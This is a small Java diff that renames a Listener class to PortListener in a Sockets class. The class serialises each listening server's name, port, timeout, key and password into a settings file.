@@ -10,7 +10,7 @@ import java.util.ArrayList;
 import java.util.List;
 
 import com.redpois0n.io.Files;
-import com.redpois0n.net.Listener;
+import com.redpois0n.net.PortListener;
 
 public class Sockets {
 	
@@ -34,8 +34,8 @@ public class Sockets {
 		try {
 			ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(new File(Files.getSettings(), "sockets.dat")));
 			List<SaveSocket> list = new ArrayList<SaveSocket>();
-			for (int i = 0; i < Listener.servers.size(); i++) {
-				Listener connection = Listener.servers.get(i);		
+			for (int i = 0; i < PortListener.servers.size(); i++) {
+				PortListener connection = PortListener.servers.get(i);		
 				SaveSocket save = new SaveSocket(connection.getName(), connection.getServer().getLocalPort(), connection.getTimeout(), connection.getKey(), connection.getPass());
 				list.add(save);
 			}
